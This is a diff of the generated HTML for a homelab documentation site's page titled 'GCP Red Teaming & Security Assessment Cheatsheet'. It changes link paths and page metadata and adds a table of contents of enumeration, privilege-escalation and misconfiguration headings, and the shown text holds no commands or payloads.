@@ -6,36 +6,42 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Oste's Homelab Documentation for various projects and setups.">
+        <meta name="description" content="GCP Red Teaming & Security Assessment Cheatsheet">
       
       
         <meta name="author" content="Stephen Kageche">
       
       
+        <link rel="canonical" href="https://hacktardinc.github.io/cloud/gcp/">
       
+      
+        <link rel="prev" href="../azure/">
+      
+      
+        <link rel="next" href="../tools/">
       
       
         
       
       
-      <link rel="icon" href="/images/favicon.ico">
+      <link rel="icon" href="../../images/favicon.ico">
       <meta name="generator" content="zensical-0.0.28">
     
     
       
-        <title>Oste's Homelab</title>
+        <title>GCP - Oste's Homelab</title>
       
     
     
       
         
       
-      <link rel="stylesheet" href="/assets/stylesheets/modern/main.6f2fbb28.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/modern/main.6f2fbb28.min.css">
       
         
           
         
-        <link rel="stylesheet" href="/assets/stylesheets/modern/palette.dfe2e883.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/modern/palette.dfe2e883.min.css">
       
       
 
@@ -54,7 +60,7 @@
       
     
     
-    <script>__md_scope=new URL("/",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
     
       
   
@@ -88,7 +94,8 @@
     <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
     <div data-md-component="skip">
       
-        <a href="#__skip" class="md-skip">
+        
+        <a href="#gcp-red-teaming-security-assessment-cheatsheet" class="md-skip">
           Skip to content
         </a>
       
@@ -104,7 +111,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="/" title="Oste&#x27;s Homelab" class="md-header__button md-logo" aria-label="Oste's Homelab" data-md-component="logo">
+    <a href="../.." title="Oste&#x27;s Homelab" class="md-header__button md-logo" aria-label="Oste's Homelab" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brick-wall-shield" viewBox="0 0 24 24"><path d="M12 9v1.258M16 3v5.46M21 9.118V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h5.75"/><path d="M22 17.5c0 2.499-1.75 3.749-3.83 4.474a.5.5 0 0 1-.335-.005c-2.085-.72-3.835-1.97-3.835-4.47V14a.5.5 0 0 1 .5-.499c1 0 2.25-.6 3.12-1.36a.6.6 0 0 1 .76-.001c.875.765 2.12 1.36 3.12 1.36a.5.5 0 0 1 .5.5zM3 15h7M3 9h12.142M8 15v6M8 3v6"/></svg>
@@ -124,7 +131,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              
+              GCP
             
           </span>
         </div>
@@ -223,7 +230,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="/" title="Oste&#x27;s Homelab" class="md-nav__button md-logo" aria-label="Oste's Homelab" data-md-component="logo">
+    <a href="../.." title="Oste&#x27;s Homelab" class="md-nav__button md-logo" aria-label="Oste's Homelab" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brick-wall-shield" viewBox="0 0 24 24"><path d="M12 9v1.258M16 3v5.46M21 9.118V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h5.75"/><path d="M22 17.5c0 2.499-1.75 3.749-3.83 4.474a.5.5 0 0 1-.335-.005c-2.085-.72-3.835-1.97-3.835-4.47V14a.5.5 0 0 1 .5-.499c1 0 2.25-.6 3.12-1.36a.6.6 0 0 1 .76-.001c.875.765 2.12 1.36 3.12 1.36a.5.5 0 0 1 .5.5zM3 15h7M3 9h12.142M8 15v6M8 3v6"/></svg>
@@ -253,7 +260,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/" class="md-nav__link">
+      <a href="../.." class="md-nav__link">
         
   
   
@@ -282,7 +289,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/markdown/" class="md-nav__link">
+      <a href="../../markdown/" class="md-nav__link">
         
   
   
@@ -331,7 +338,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="/docker/" class="md-nav__link ">
+            <a href="../../docker/" class="md-nav__link ">
               
   
   
@@ -377,7 +384,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/docker/cheatsheet/" class="md-nav__link">
+      <a href="../../docker/cheatsheet/" class="md-nav__link">
         
   
   
@@ -434,7 +441,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="/research/" class="md-nav__link ">
+            <a href="../../research/" class="md-nav__link ">
               
   
   
@@ -480,7 +487,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/research/CVE-2025-68613/" class="md-nav__link">
+      <a href="../../research/CVE-2025-68613/" class="md-nav__link">
         
   
   
@@ -543,7 +550,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="/howto/" class="md-nav__link ">
+            <a href="../../howto/" class="md-nav__link ">
               
   
   
@@ -589,7 +596,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/howto/dns-records-guide/" class="md-nav__link">
+      <a href="../../howto/dns-records-guide/" class="md-nav__link">
         
   
   
@@ -619,7 +626,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/howto/pentesting-dns/" class="md-nav__link">
+      <a href="../../howto/pentesting-dns/" class="md-nav__link">
         
   
   
@@ -649,7 +656,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/howto/file-transfer-cheatsheet/" class="md-nav__link">
+      <a href="../../howto/file-transfer-cheatsheet/" class="md-nav__link">
         
   
   
@@ -679,7 +686,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/howto/pentesting-tunneling/" class="md-nav__link">
+      <a href="../../howto/pentesting-tunneling/" class="md-nav__link">
         
   
   
@@ -738,7 +745,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="/osint/" class="md-nav__link ">
+            <a href="../../osint/" class="md-nav__link ">
               
   
   
@@ -784,7 +791,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/osint/google-dorking-cheatsheet/" class="md-nav__link">
+      <a href="../../osint/google-dorking-cheatsheet/" class="md-nav__link">
         
   
   
@@ -814,7 +821,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/osint/shodan-queries-cheatsheet/" class="md-nav__link">
+      <a href="../../osint/shodan-queries-cheatsheet/" class="md-nav__link">
         
   
   
@@ -848,6 +855,8 @@
       
   
   
+    
+  
   
   
     
@@ -871,15 +880,15 @@
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="/cloud/" class="md-nav__link ">
+            <a href="../" class="md-nav__link ">
               
   
   
@@ -905,7 +914,7 @@
             
           </div>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_7">
             <span class="md-nav__icon md-icon"></span>
             
@@ -925,7 +934,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/cloud/introduction/" class="md-nav__link">
+      <a href="../introduction/" class="md-nav__link">
         
   
   
@@ -955,7 +964,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/cloud/aws/" class="md-nav__link">
+      <a href="../aws/" class="md-nav__link">
         
   
   
@@ -985,7 +994,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/cloud/azure/" class="md-nav__link">
+      <a href="../azure/" class="md-nav__link">
         
   
   
@@ -1012,10 +1021,39 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="/cloud/gcp/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M23 14.75C23 18.2 20.2 21 16.75 21h-9.5C3.8 21 1 18.2 1 14.75c0-2.14 1.08-4.03 2.71-5.15C4.58 5.82 7.96 3 12 3s7.42 2.82 8.29 6.6A6.22 6.22 0 0 1 23 14.75M16.63 17c1.31 0 2.37-1.06 2.37-2.37 0-1.28-1-2.33-2.28-2.38l.03-.5a4.754 4.754 0 0 0-8.32-3.14c1.5.29 2.8 1.11 3.71 2.25L9.5 13.5c-.42-.73-1.21-1.25-2.12-1.25-1.32 0-2.38 1.06-2.38 2.38 0 1.27 1 2.3 2.25 2.37z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    GCP
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1033,6 +1071,394 @@
   
 
       </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#google-cloud-ecosystem-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Google Cloud Ecosystem Overview
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Google Cloud Ecosystem Overview">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cloud-identity-deep-dive" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cloud Identity Deep Dive
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#google-cloud-platform-fundamentals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Google Cloud Platform Fundamentals
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gcp-authentication-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GCP Authentication Methods
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="GCP Authentication Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#authentication-credential-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication Credential Types
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Authentication Credential Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#long-term-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Long-Term Credentials
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Long-Term Credentials">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#graphical-user-interface-gui" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Graphical User Interface (GUI)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#programmatic-interface-clisdk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Programmatic Interface (CLI/SDK)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#short-term-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Short-Term Credentials
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Short-Term Credentials">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#programmatic-interface-clisdkapi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Programmatic Interface (CLI/SDK/API)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gcloud-cli-authentication-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        gcloud CLI Authentication Operations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-storage-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Storage &amp; Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Credential Storage &amp; Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#key-files-and-databases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key files and databases
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#google-cloud-core-services-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Google Cloud Core Services Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Google Cloud Core Services Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#organization-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Organization Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#project-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Project Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#service-account-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Account Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#role-permission-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Role &amp; Permission Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advanced-enumeration-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Advanced Enumeration Commands
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#red-team-operations-in-google-cloud" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Red Team Operations in Google Cloud
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Red Team Operations in Google Cloud">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-compromise-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Compromise &amp; Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#compute-instance-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Compute Instance Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#storage-bucket-enumeration-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Storage Bucket Enumeration &amp; Exfiltration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privilege-escalation-pathways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation Pathways
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automated-enumeration-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automated Enumeration Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#additional-red-team-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Additional Red Team Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-misconfigurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Misconfigurations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#critical-permissions-to-hunt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Critical Permissions to Hunt
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1045,7 +1471,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/cloud/tools/" class="md-nav__link">
+      <a href="../tools/" class="md-nav__link">
         
   
   
@@ -1104,7 +1530,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="/pentesting-containers/" class="md-nav__link ">
+            <a href="../../pentesting-containers/" class="md-nav__link ">
               
   
   
@@ -1150,7 +1576,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/pentesting-containers/docker-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-containers/docker-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1180,7 +1606,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/pentesting-containers/kubernetes-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-containers/kubernetes-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1245,7 +1671,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="/pentesting-databases/" class="md-nav__link ">
+            <a href="../../pentesting-databases/" class="md-nav__link ">
               
   
   
@@ -1291,7 +1717,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/pentesting-databases/mongodb-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-databases/mongodb-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1321,7 +1747,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/pentesting-databases/mysql-mariadb-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-databases/mysql-mariadb-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1351,7 +1777,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/pentesting-databases/postgres-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-databases/postgres-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1381,7 +1807,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/pentesting-databases/redis-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-databases/redis-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1411,7 +1837,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/pentesting-databases/couchdb-pentesting-cheatsheet/" class="md-nav__link">
+      <a href="../../pentesting-databases/couchdb-pentesting-cheatsheet/" class="md-nav__link">
         
   
   
@@ -1480,7 +1906,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="/socops/" class="md-nav__link ">
+            <a href="../../socops/" class="md-nav__link ">
               
   
   
@@ -1524,7 +1950,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/socops/arkime/" class="md-nav__link">
+      <a href="../../socops/arkime/" class="md-nav__link">
         
   
   
@@ -1554,7 +1980,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/socops/velociraptor/" class="md-nav__link">
+      <a href="../../socops/velociraptor/" class="md-nav__link">
         
   
   
@@ -1584,7 +2010,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/socops/flarevm/" class="md-nav__link">
+      <a href="../../socops/flarevm/" class="md-nav__link">
         
   
   
@@ -1616,7 +2042,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/socops/thehive/" class="md-nav__link">
+      <a href="../../socops/thehive/" class="md-nav__link">
         
   
   
@@ -1646,7 +2072,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/socops/cortex/" class="md-nav__link">
+      <a href="../../socops/cortex/" class="md-nav__link">
         
   
   
@@ -1676,7 +2102,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/socops/misp/" class="md-nav__link">
+      <a href="../../socops/misp/" class="md-nav__link">
         
   
   
@@ -1706,7 +2132,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/socops/shuffle/" class="md-nav__link">
+      <a href="../../socops/shuffle/" class="md-nav__link">
         
   
   
@@ -1767,7 +2193,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="/wazuh/" class="md-nav__link ">
+            <a href="../../wazuh/" class="md-nav__link ">
               
   
   
@@ -1813,7 +2239,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/wazuh/assistant/" class="md-nav__link">
+      <a href="../../wazuh/assistant/" class="md-nav__link">
         
   
   
@@ -1843,7 +2269,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/wazuh/stepbystep/" class="md-nav__link">
+      <a href="../../wazuh/stepbystep/" class="md-nav__link">
         
   
   
@@ -1873,7 +2299,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/wazuh/vm/" class="md-nav__link">
+      <a href="../../wazuh/vm/" class="md-nav__link">
         
   
   
@@ -1932,7 +2358,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="/windows/" class="md-nav__link ">
+            <a href="../../windows/" class="md-nav__link ">
               
   
   
@@ -1978,7 +2404,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/windows/defender/" class="md-nav__link">
+      <a href="../../windows/defender/" class="md-nav__link">
         
   
   
@@ -2008,7 +2434,7 @@
   
   
     <li class="md-nav__item">
-      <a href="/windows/update/" class="md-nav__link">
+      <a href="../../windows/update/" class="md-nav__link">
         
   
   
@@ -2056,6 +2482,383 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#google-cloud-ecosystem-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Google Cloud Ecosystem Overview
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Google Cloud Ecosystem Overview">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cloud-identity-deep-dive" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cloud Identity Deep Dive
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#google-cloud-platform-fundamentals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Google Cloud Platform Fundamentals
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gcp-authentication-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GCP Authentication Methods
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="GCP Authentication Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#authentication-credential-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication Credential Types
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Authentication Credential Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#long-term-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Long-Term Credentials
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Long-Term Credentials">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#graphical-user-interface-gui" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Graphical User Interface (GUI)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#programmatic-interface-clisdk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Programmatic Interface (CLI/SDK)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#short-term-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Short-Term Credentials
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Short-Term Credentials">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#programmatic-interface-clisdkapi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Programmatic Interface (CLI/SDK/API)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gcloud-cli-authentication-operations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        gcloud CLI Authentication Operations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-storage-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Storage &amp; Security
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Credential Storage &amp; Security">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#key-files-and-databases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key files and databases
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#google-cloud-core-services-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Google Cloud Core Services Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Google Cloud Core Services Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#organization-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Organization Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#project-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Project Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#service-account-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Account Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#role-permission-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Role &amp; Permission Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advanced-enumeration-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Advanced Enumeration Commands
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#red-team-operations-in-google-cloud" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Red Team Operations in Google Cloud
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Red Team Operations in Google Cloud">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-compromise-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Compromise &amp; Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#compute-instance-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Compute Instance Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#storage-bucket-enumeration-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Storage Bucket Enumeration &amp; Exfiltration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privilege-escalation-pathways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation Pathways
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automated-enumeration-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automated Enumeration Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#additional-red-team-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Additional Red Team Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-misconfigurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Misconfigurations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#critical-permissions-to-hunt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Critical Permissions to Hunt
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -2073,11 +2876,503 @@
   
 
 
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
